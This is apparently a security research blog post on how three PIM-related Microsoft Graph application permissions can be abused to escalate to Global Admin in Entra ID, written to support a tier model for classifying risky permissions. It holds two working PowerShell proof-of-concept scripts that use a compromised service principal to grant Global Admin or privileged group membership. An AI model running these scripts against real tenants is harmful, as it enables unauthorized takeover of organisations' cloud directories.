---
title: "Abusing PIM-related application permissions in Microsoft Graph - Part 1"
catchphrase: "Escalating to Global Admin via active assignments."
image: "/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/00_Abusing_PIM_related_application_permissions_In_Microsoft_Graph.png"
last_modified_at: 2024-07-27
tags:
  - Microsoft Graph
  - Entra ID
  - Azure
  - Pentesting
  - Red-teaming
---

## Introduction

One of my latest projects has been to develop a tier model based on known attack paths to categorize Entra roles and Microsoft Graph application permissions. The project lead me to researching specific application permissions potentially classified as Tier-0, but with no public resource documenting their abuse.

In my mind (or at least in the tier model I am developing), “Tier-0” contains application permissions with at least *one* scenario where they can be abused to escalate to Global Admin. During my research, I have discovered a large number of Tier-0 permissions related to Privileged Identity Management (PIM), which I thought should be better known by the public.

### Overview of the series

The original idea was to write a single post documenting all PIM-related application permissions that could be abused to escalate to Global Admin. I quickly realized the final post would be too large to digest, so I decided to make a series out it. 

This series is structured as follows:
- **Part 1**: Escalating to Global Admin via active assignments 
- **Part 2**: Escalating to Global Admin via eligible assignments 
- **Part 3**: Bypassing assignment, eligibility and activation requirements 
- **Part 4**: Investigating legacy permissions 

### What permissions are addressed in this post?

This post discusses the following MS Graph application permissions:
- [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory)
- [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup)
- [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup)


### Previous work about the abuse of specific permissions

The abuse of MS Graph application permissions for escalating privileges in Entra ID and other Microsoft 365 services is not a new topic. For references about previous work in this area, I have tried to collect sources documenting the abuse of specific permissions in the following overview:

| Application permission | Research documenting abuse for privilege escalation | 
|---|---|
| [`AppRoleAssignment.ReadWrite.All`](https://learn.microsoft.com/en-us/graph/permissions-reference#approleassignmentreadwriteall) | [https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)<br> [https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/](https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/) |
| [`Directory.ReadWrite.All`](https://learn.microsoft.com/en-us/graph/permissions-reference#directoryreadwriteall) | [https://posts.specterops.io/directory-readwrite-all-is-not-as-powerful-as-you-might-think-c5b09a8f78a8](https://posts.specterops.io/directory-readwrite-all-is-not-as-powerful-as-you-might-think-c5b09a8f78a8) | 
| [`Policy.ReadWrite.PermissionGrant`](https://learn.microsoft.com/en-us/graph/permissions-reference#policyreadwritepermissiongrant) | [https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/](https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/) |
| [`RoleManagement.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementreadwritedirectory) | [https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) |
| [`UserAuthenticationMethod.ReadWrite.All`](https://learn.microsoft.com/en-us/graph/permissions-reference#userauthenticationmethodreadwriteall) | [https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/](https://www.tenchisecurity.com/manipulating-roles-and-permissions-in-microsoft-365-environment-via-ms-graph/) |

Don’t hesitate to let me know if I have missed something, as it is highly possible that I am not aware of all the research that has been published. Note that the idea is to collect only posts documenting the abuse of **specific** application permissions (i.e. not everything about the abuse of service principals or MS Graph) 😊


### What is PIM?

[Privileged Identity Management (PIM)]( https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure) is an access-management feature, which enables administrators to provide just-in-time access via eligibilities and activations. The idea is to replace permanent role assignments with a solution making users eligible to roles, and allowing them to activate them temporarily to provide just-in-time access.

Users can be eligible to roles directly or via group memberships. In the first case, the user is provisioned directly with the role upon activation, while the second case temporarily adds the user to a security group that is already assigned roles permanently. The activation can be conditioned to specific requirements, such as the approval of an administrator. 


## Privilege escalation via active PIM role assignment

### Overview of abuse information

| Abused application permission | Path type | Known shortest path | Example |
| [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory) | Direct | Can assign the Global Admin role to a controlled user account, by creating an active PIM role assignment. | TA assigns the Global Admin role to a user account in their control (assigning to the compromised SP is not possible), re-authenticates with the user account and escalates to Global Admin. |

### Attack path visualization

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/01_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/01_screenshot.png)

### Proof of Concept

We will assume that we are in a scenario where we have compromised a service principal with the [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory) permission, and where we control an unprivileged user account with no assigned Entra role:

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/02_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/02_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/03_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/03_screenshot.png)

The PowerShell code to leverage the compromised “Harmless app” and assign the Global Admin role to our “Harmless user account” user is as follows:

```
# Set SP info
$tid = ''
$appId = ''
$password = ''

# Set user info
$userId = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request active PIM role assignment 
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")
$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$activeAssignment = @{
    action = 'adminAssign'
    justification = 'PoC'
    roleDefinitionId = $roleDefinitionId
    directoryScopeId = '/'
    principalId = $userId
    scheduleInfo = @{
        startDateTime = $yesterday
        expiration = @{
            type = 'NoExpiration'
        }
    }
}

$body = ConvertTo-Json -InputObject $activeAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

By executing the above PowerShell script, we can confirm that the [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory) permission can be leveraged to assign the Global Admin role to the controlled user via an active PIM role assignment:

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/04_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/04_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/05_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/05_screenshot.png)


## Privilege escalation via active PIM group-membership assignment 

### Overview of abuse information

| Abused application permission | Path type | Known shortest path | Example |
|---|---|---|---|
| [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup) | Direct | Can become owner or member of a group with an active Global Admin assignment (i.e. can update the membership of role-assignable groups). | TA adds a controlled user account to a group that is actively assigned the Global Admin role, re-authenticates with the account and escalates to Global Admin. |
| [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup) | Direct | Same as [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup). | Same as [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup). |

### Attack path visualization

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/06_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/06_screenshot.png)

### Proof of Concept

We will assume that we are in a scenario where we have compromised a service principal with the [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup) or the [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup) permission, and where we control an unprivileged user account with no group membership:

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/07_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/07_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/08_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/08_screenshot.png)

We will also assume that the tenant we are targeting provides administrative permissions such as Entra roles via group memberships. Emergency “break-glass” accounts are therefore provisioned as Global Admins via a dedicated security group as follows:

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/09_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/09_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/10_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/10_screenshot.png)

The PowerShell code to leverage the compromised “Harmless app” and assign our “Harmless user account” to the “Global Admins” group is as follows:

```
## Set SP info
$tid = ''
$appId = ''
$password = ''

# Set user info
$userId = ''

# Set targeted group info
$groupId = ''


# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request membership update of role-assignable group (membership is set to last 24 hours)
$oid = (Get-AzADServicePrincipal -ApplicationId $appid).Id
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")

$uri = 'https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$activeAssignment = @{
    action = 'adminAssign'
    justification = 'PoC'
    accessId = 'member'
    groupId = $groupId
    principalId = $userId
    scheduleInfo = @{
        startDateTime = $yesterday
        expiration = @{
            type = 'afterDuration'
            duration = 'PT24H'
        }
    }
}

$body = ConvertTo-Json -InputObject $activeAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

By executing the above PowerShell script, we can confirm that the [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup) or [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup) permission can be leveraged to add a controlled user account to a role-assignable group and escalate privileges via the group’s membership:

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/11_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/11_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/12_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/12_screenshot.png)

[![](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/13_screenshot.png)](/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/13_screenshot.png)


## Conclusion 

As mentioned in the introduction, I am currently working on a tier model to categorize MS Graph application permissions based on known attacks paths. We have seen that the [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory), [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup) and [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup) permission, all represent a risk for escalating to Global Admin. 

Therefore, these permissions should be classified as Tier-0, together with other permissions that have at least one known technique to create a path to Global Admin. This does **not** mean a path necessarily exist in every tenant, as privilege escalations are often tenant specific, but the goal with the model is to identify permissions with a **risk** of having a path to Global Admin. Note that the table format used in the “Overview of abuse information” sections is the format that will be used for documenting Tier-0 assets in the first version of the tier model.

Finally, some readers may wonder about situations where an active PIM assignment requires the use of MFA, due to a role management policy. Stay assured, bypassing constraints of this kind will be addressed in details in part 3 of this series, so stay tuned 😉
